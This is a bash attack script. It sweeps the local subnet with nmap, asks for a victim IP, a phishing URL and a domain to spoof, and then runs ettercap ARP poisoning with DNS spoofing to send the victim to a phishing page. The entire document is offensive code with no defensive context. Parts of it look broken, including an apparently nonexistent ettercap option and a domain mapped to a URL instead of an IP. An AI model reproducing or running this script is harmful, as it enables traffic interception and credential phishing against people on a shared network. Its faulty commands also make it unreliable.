#!/bin/bash

echo "[*] Scanning for devices on the network..."
nmap -sn $(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}/24') > devices.txt

echo "[*] Found devices:"
awk '/Nmap scan report/{print $5}' devices.txt
IPs=$(awk '/Nmap scan report/{print $5}' devices.txt)

read -p "Enter the target IP address to poison DNS: " TARGET_IP

read -p "Enter the fake phishing URL (e.g., http://attacker-phishing-site.com): " PHISHING_URL
read -p "Enter the DNS name to spoof (e.g., www.target-site.com): " SPOOFED_DOMAIN

echo "[*] Starting DNS spoofing..."
ettercap -T -q -i eth0 -M arp:remote -T -P dns_spoof /$TARGET_IP/

echo "[*] Spoofing DNS records for $SPOOFED_DOMAIN to $PHISHING_URL"
ettercap -T -q -i eth0 -M arp:remote -P dns_spoof --spoof-domain "$SPOOFED_DOMAIN=$PHISHING_URL"

echo "[*] DNS poisoning active. Phishing page should now load for $TARGET_IP."
